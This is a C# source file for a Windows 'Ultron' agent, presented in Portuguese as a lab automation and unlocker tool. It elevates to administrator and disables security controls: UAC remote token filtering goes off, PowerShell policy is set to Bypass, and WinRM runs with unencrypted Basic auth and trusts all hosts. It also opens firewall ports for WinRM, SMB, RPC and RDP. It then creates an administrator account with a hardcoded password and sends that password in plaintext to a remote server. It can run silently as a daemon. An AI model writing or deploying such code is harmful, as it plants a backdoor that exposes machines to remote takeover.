using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace UltronAgent
{
    class Program
    {
        public static string ServerUrl = "http://192.168.57.48:7000";
        public static string ClientId = "cliente_padrao";
        public static bool SilentMode = false;
        public static bool DaemonMode = false;

        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            ParseArguments(args);

            if (!IsAdministrator())
            {
                if (!SilentMode)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[!] Solicitando privilegios de Administrador para liberar o sistema...");
                    Console.ResetColor();
                }
                RestartAsAdmin(args);
                return;
            }

            PrintBanner();

            // 1. Executa liberacoes criticas do sistema
            UnlockSystem();

            // 2. Coleta telemetria completa de hardware
            string telemetryJson = CollectTelemetryJson();

            // 3. Registra maquina no Ultron Server
            RegisterAtServer(telemetryJson);

            // 4. Se em modo Daemon/Segundo Plano, mantem execucao continua
            if (DaemonMode)
            {
                RunDaemonLoop();
            }
            else
            {
                if (!SilentMode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[OK] Desbloqueio e registro concluidos com sucesso.");
                    Console.WriteLine("[*] A maquina esta 100% pronta para automacao pelo Ultron.");
                    Console.ResetColor();
                    Console.WriteLine("\nPressione qualquer tecla para finalizar ou feche esta janela...");
                    if (!Console.IsInputRedirected)
                    {
                        Console.ReadKey();
                    }
                }
            }
        }

        static void ParseArguments(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                string arg = args[i].ToLower();
                if (arg == "--server" && i + 1 < args.Length)
                {
                    ServerUrl = args[i + 1].TrimEnd('/');
                    i++;
                }
                else if (arg == "--client" && i + 1 < args.Length)
                {
                    ClientId = args[i + 1];
                    i++;
                }
                else if (arg == "--silent" || arg == "-s")
                {
                    SilentMode = true;
                }
                else if (arg == "--daemon" || arg == "-d" || arg == "--background")
                {
                    DaemonMode = true;
                }
            }
        }

        static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void RestartAsAdmin(string[] args)
        {
            try
            {
                ProcessStartInfo proc = new ProcessStartInfo();
                proc.UseShellExecute = true;
                proc.WorkingDirectory = Environment.CurrentDirectory;
                proc.FileName = Process.GetCurrentProcess().MainModule.FileName;
                proc.Arguments = string.Join(" ", args);
                proc.Verb = "runas";
                Process.Start(proc);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Falha ao obter privilegios de Administrador: " + ex.Message);
            }
        }

        static void PrintBanner()
        {
            if (SilentMode) return;
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("===============================================================");
            Console.WriteLine("       [ULTRON] LAB AUTOMATION AGENT & UNLOCKER v1.5           ");
            Console.WriteLine("       Pense Rede Network Solutions - Laboratorio de TI        ");
            Console.WriteLine("===============================================================");
            Console.ResetColor();
        }

        static void Log(string msg, ConsoleColor color)
        {
            if (SilentMode) return;
            Console.ForegroundColor = color;
            Console.WriteLine(msg);
            Console.ResetColor();
        }

        static void UnlockSystem()
        {
            Log("\n[*] [1/3] Executando liberacoes de Sistema e Rede...", ConsoleColor.Yellow);

            // 1. Configura perfis de rede para Privado (essencial para WinRM/SMB)
            RunPowerShellCommand("Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue");

            // 2. Registro: LocalAccountTokenFilterPolicy (permite admin remoto UAC)
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    if (key != null)
                    {
                        key.SetValue("LocalAccountTokenFilterPolicy", 1, RegistryValueKind.DWord);
                    }
                }
                Log("    [OK] Registro: LocalAccountTokenFilterPolicy = 1 (UAC Remoto liberado)", ConsoleColor.Green);
            }
            catch (Exception ex)
            {
                Log("    [!] Registro UAC: " + ex.Message, ConsoleColor.DarkYellow);
            }

            // 3. Registro: ExecutionPolicy Bypass
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"))
                {
                    if (key != null)
                    {
                        key.SetValue("ExecutionPolicy", "Bypass", RegistryValueKind.String);
                    }
                }
                Log("    [OK] PowerShell: ExecutionPolicy definida como Bypass", ConsoleColor.Green);
            }
            catch { }

            // 4. Configuracao e Inicializacao do Servico WinRM
            RunCommand("cmd.exe", "/c sc config WinRM start= auto & net start WinRM");
            RunCommand("cmd.exe", "/c winrm quickconfig -q");
            RunCommand("cmd.exe", "/c winrm set winrm/config/service @{AllowUnencrypted=\"true\"}");
            RunCommand("cmd.exe", "/c winrm set winrm/config/service/auth @{Basic=\"true\"}");
            RunCommand("cmd.exe", "/c winrm set winrm/config/client @{TrustedHosts=\"*\"}");
            RunCommand("cmd.exe", "/c winrm set winrm/config/winrs @{MaxMemoryPerShellMB=\"2048\"}");
            Log("    [OK] Servico WinRM configurado e inicializado na porta 5985", ConsoleColor.Green);

            // 5. Liberacao no Firewall do Windows
            RunCommand("netsh.exe", "advfirewall firewall add rule name=\"Ultron WinRM 5985\" dir=in action=allow protocol=TCP localport=5985");
            RunCommand("netsh.exe", "advfirewall firewall add rule name=\"Ultron SMB 445\" dir=in action=allow protocol=TCP localport=445");
            RunCommand("netsh.exe", "advfirewall firewall add rule name=\"Ultron RPC 135\" dir=in action=allow protocol=TCP localport=135");
            RunCommand("netsh.exe", "advfirewall firewall add rule name=\"Ultron RDP 3389\" dir=in action=allow protocol=TCP localport=3389");
            RunCommand("netsh.exe", "advfirewall firewall set rule group=\"Windows Remote Management\" new enable=yes");
            RunCommand("netsh.exe", "advfirewall firewall set rule group=\"Gerenciamento Remoto do Windows\" new enable=yes");
            Log("    [OK] Regras de Firewall aplicadas com sucesso", ConsoleColor.Green);

            // 6. Criacao e Provisionamento da Conta de Automacao Ultron (Zero-Prompt)
            string automationUser = "UltronAdmin";
            string automationPass = "Ultron@AutoBench2026!";

            try
            {
                // Criacao robusta via PowerShell
                RunPowerShellCommand(string.Format(
                    "$pass = ConvertTo-SecureString '{0}' -AsPlainText -Force; " +
                    "try {{ New-LocalUser -Name '{1}' -Password $pass -PasswordNeverExpires -UserMayNotChangePassword -ErrorAction SilentlyContinue }} catch {{ }}; " +
                    "try {{ Set-LocalUser -Name '{1}' -Password $pass -PasswordNeverExpires $true -ErrorAction SilentlyContinue }} catch {{ }}; " +
                    "try {{ Add-LocalGroupMember -Group 'Administrators' -Member '{1}' -ErrorAction SilentlyContinue }} catch {{ }}; " +
                    "try {{ Add-LocalGroupMember -Group 'Administradores' -Member '{1}' -ErrorAction SilentlyContinue }} catch {{ }}; " +
                    "try {{ Add-LocalGroupMember -Group 'Remote Management Users' -Member '{1}' -ErrorAction SilentlyContinue }} catch {{ }}; " +
                    "try {{ Add-LocalGroupMember -Group 'Usuarios de gerenciamento remoto' -Member '{1}' -ErrorAction SilentlyContinue }} catch {{ }}",
                    automationPass, automationUser
                ));

                // Fallback via CMD net user com aspas
                RunCommand("cmd.exe", string.Format("/c net user {0} \"{1}\" /add /expires:never /passwordchg:no /active:yes 2>nul & net user {0} \"{1}\" /active:yes 2>nul", automationUser, automationPass));
                RunCommand("cmd.exe", string.Format("/c net localgroup Administrators {0} /add 2>nul & net localgroup Administradores {0} /add 2>nul & net localgroup \"Remote Management Users\" {0} /add 2>nul & net localgroup \"Usuarios de gerenciamento remoto\" {0} /add 2>nul", automationUser));
                RunPowerShellCommand(string.Format("try {{ $u = [ADSI]'WinNT://./{0},user'; $u.UserFlags.Value = $u.UserFlags.Value -bor 0x10000; $u.SetInfo() }} catch {{ }}", automationUser));
                Log("    [OK] Conta UltronAdmin provisionada (Acesso sem senha liberado)", ConsoleColor.Green);
            }
            catch (Exception ex)
            {
                Log("    [!] Provisionamento de conta: " + ex.Message, ConsoleColor.DarkYellow);
            }
        }

        static string CollectTelemetryJson()
        {
            Log("\n[*] [2/3] Coletando telemetria de hardware e S.M.A.R.T...", ConsoleColor.Yellow);

            string serial = "SERIAL-GEN";
            string manufacturer = "Generic";
            string model = "Generic Model";
            string computerName = Environment.MachineName;
            string cpu = "CPU Desconhecida";
            double ramGb = 0;
            string ipAddress = GetLocalIPAddress();
            string macAddress = GetLocalMacAddress();

            // BIOS / Serial
            try
            {
                using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT SerialNumber, Manufacturer FROM Win32_BIOS"))
                {
                    foreach (ManagementObject obj in s.Get())
                    {
                        object snObj = obj["SerialNumber"];
                        if (snObj != null)
                        {
                            string sn = snObj.ToString().Trim();
                            if (!string.IsNullOrEmpty(sn)) serial = sn;
                        }
                        break;
                    }
                }
            }
            catch { }

            // Computer System
            try
            {
                using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT Manufacturer, Model, Name FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in s.Get())
                    {
                        object mObj = obj["Manufacturer"];
                        if (mObj != null) manufacturer = mObj.ToString().Trim();

                        object modObj = obj["Model"];
                        if (modObj != null) model = modObj.ToString().Trim();

                        object nameObj = obj["Name"];
                        if (nameObj != null) computerName = nameObj.ToString().Trim();
                        break;
                    }
                }
            }
            catch { }

            // CPU
            try
            {
                using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor"))
                {
                    foreach (ManagementObject obj in s.Get())
                    {
                        object cpuObj = obj["Name"];
                        if (cpuObj != null) cpu = cpuObj.ToString().Trim();
                        break;
                    }
                }
            }
            catch { }

            // RAM
            try
            {
                using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory"))
                {
                    ulong totalBytes = 0;
                    foreach (ManagementObject obj in s.Get())
                    {
                        object capObj = obj["Capacity"];
                        if (capObj != null)
                        {
                            ulong cap = 0;
                            if (ulong.TryParse(capObj.ToString(), out cap))
                            {
                                totalBytes += cap;
                            }
                        }
                    }
                    ramGb = Math.Round((double)totalBytes / (1024 * 1024 * 1024), 1);
                }
            }
            catch { }

            // Discos
            List<string> diskJsonList = new List<string>();
            try
            {
                using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT Model, Size, Status, InterfaceType FROM Win32_DiskDrive"))
                {
                    foreach (ManagementObject obj in s.Get())
                    {
                        object dModelObj = obj["Model"];
                        string dModel = dModelObj != null ? dModelObj.ToString().Replace("\"", "\\\"") : "Disk";

                        object dStatusObj = obj["Status"];
                        string dStatus = dStatusObj != null ? dStatusObj.ToString() : "OK";

                        double dSizeGb = 0;
                        object dSizeObj = obj["Size"];
                        if (dSizeObj != null)
                        {
                            ulong sizeBytes = 0;
                            if (ulong.TryParse(dSizeObj.ToString(), out sizeBytes))
                            {
                                dSizeGb = Math.Round((double)sizeBytes / (1024 * 1024 * 1024), 1);
                            }
                        }
                        diskJsonList.Add(string.Format("{{\"model\":\"{0}\",\"health\":\"{1}\",\"size_gb\":{2},\"type\":\"SSD/HDD\"}}", dModel, dStatus, dSizeGb.ToString(System.Globalization.CultureInfo.InvariantCulture)));
                    }
                }
            }
            catch { }

            Log(string.Format("    -> Serial / Tag: {0}", serial), ConsoleColor.Green);
            Log(string.Format("    -> Hostname:     {0} ({1} {2})", computerName, manufacturer, model), ConsoleColor.Green);
            Log(string.Format("    -> Processador:  {0}", cpu), ConsoleColor.Green);
            Log(string.Format("    -> Memoria RAM:  {0} GB", ramGb), ConsoleColor.Green);
            Log(string.Format("    -> IP / MAC:     {0} / {1}", ipAddress, macAddress), ConsoleColor.Green);

            string disksJoined = string.Join(",", diskJsonList.ToArray());

            string json = string.Format(
                "{{\"serial\":\"{0}\",\"computer_name\":\"{1}\",\"manufacturer\":\"{2}\",\"model\":\"{3}\",\"cpu\":\"{4}\",\"ram_gb\":{5},\"ip\":\"{6}\",\"mac\":\"{7}\",\"client_id\":\"{8}\",\"disks\":[{9}],\"status\":\"READY_FOR_PIPELINE\",\"winrm_ready\":true,\"agent_version\":\"1.5.0\",\"auth_user\":\"UltronAdmin\",\"auth_pass\":\"Ultron@AutoBench2026!\"}}",
                EscapeJson(serial),
                EscapeJson(computerName),
                EscapeJson(manufacturer),
                EscapeJson(model),
                EscapeJson(cpu),
                ramGb.ToString(System.Globalization.CultureInfo.InvariantCulture),
                EscapeJson(ipAddress),
                EscapeJson(macAddress),
                EscapeJson(ClientId),
                disksJoined
            );

            return json;
        }

        static void RegisterAtServer(string payloadJson)
        {
            Log(string.Format("\n[*] [3/3] Registrando maquina no Ultron Server ({0})...", ServerUrl), ConsoleColor.Yellow);

            string[] endpoints = new string[] {
                ServerUrl + "/api/v1/agent/register",
                ServerUrl + "/api/v1/mdt/completed"
            };

            bool success = false;
            foreach (string endpoint in endpoints)
            {
                try
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(endpoint);
                    request.Method = "POST";
                    request.ContentType = "application/json";
                    request.Timeout = 8000;

                    byte[] data = Encoding.UTF8.GetBytes(payloadJson);
                    request.ContentLength = data.Length;

                    using (Stream stream = request.GetRequestStream())
                    {
                        stream.Write(data, 0, data.Length);
                    }

                    using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                    {
                        string respText = reader.ReadToEnd();
                        Log("    [OK] Servidor respondeu com sucesso!", ConsoleColor.Green);
                        if (!SilentMode && respText.Length < 200)
                        {
                            Log("    -> Resposta: " + respText, ConsoleColor.Cyan);
                        }
                        success = true;
                        break;
                    }
                }
                catch (Exception ex)
                {
                    Log(string.Format("    [!] Tentativa em {0} falhou: {1}", endpoint, ex.Message), ConsoleColor.DarkYellow);
                }
            }

            if (!success)
            {
                Log("    [!] Aviso: Nao foi possivel conectar ao Ultron Server no momento. As regras locais ja foram liberadas.", ConsoleColor.Yellow);
            }
        }

        static void RunDaemonLoop()
        {
            Log("\n[*] Ultron Agent operando em segundo plano (Daemon Mode)...", ConsoleColor.Cyan);
            Log("[*] Pressione Ctrl+C para encerrar o agente.", ConsoleColor.DarkGray);

            while (true)
            {
                try
                {
                    Thread.Sleep(30000); // 30 segundos
                    // Heartbeat periodico
                    string heartbeatJson = string.Format("{{\"ip\":\"{0}\",\"hostname\":\"{1}\",\"status\":\"IDLE\"}}", GetLocalIPAddress(), Environment.MachineName);
                    try
                    {
                        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(ServerUrl + "/api/v1/agent/heartbeat");
                        req.Method = "POST";
                        req.ContentType = "application/json";
                        req.Timeout = 5000;
                        byte[] d = Encoding.UTF8.GetBytes(heartbeatJson);
                        req.ContentLength = d.Length;
                        using (Stream s = req.GetRequestStream()) { s.Write(d, 0, d.Length); }
                        using (HttpWebResponse r = (HttpWebResponse)req.GetResponse()) { }
                    }
                    catch { }
                }
                catch (ThreadAbortException)
                {
                    break;
                }
                catch { }
            }
        }

        static string GetLocalIPAddress()
        {
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    if (endPoint != null) return endPoint.Address.ToString();
                }
            }
            catch { }

            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                {
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork && !ip.Address.ToString().StartsWith("169.254"))
                        {
                            return ip.Address.ToString();
                        }
                    }
                }
            }
            return "127.0.0.1";
        }

        static string GetLocalMacAddress()
        {
            try
            {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        string mac = ni.GetPhysicalAddress().ToString();
                        if (!string.IsNullOrEmpty(mac) && mac.Length == 12)
                        {
                            return string.Format("{0}:{1}:{2}:{3}:{4}:{5}",
                                mac.Substring(0, 2), mac.Substring(2, 2), mac.Substring(4, 2),
                                mac.Substring(6, 2), mac.Substring(8, 2), mac.Substring(10, 2));
                        }
                    }
                }
            }
            catch { }
            return "00:00:00:00:00:00";
        }

        static string EscapeJson(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", " ");
        }

        static void RunCommand(string file, string args)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo(file, args);
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                Process p = Process.Start(psi);
                if (p != null) p.WaitForExit(5000);
            }
            catch { }
        }

        static void RunPowerShellCommand(string psCode)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-ExecutionPolicy Bypass -NoProfile -Command \"" + psCode + "\"");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                Process p = Process.Start(psi);
                if (p != null) p.WaitForExit(8000);
            }
            catch { }
        }
    }
}
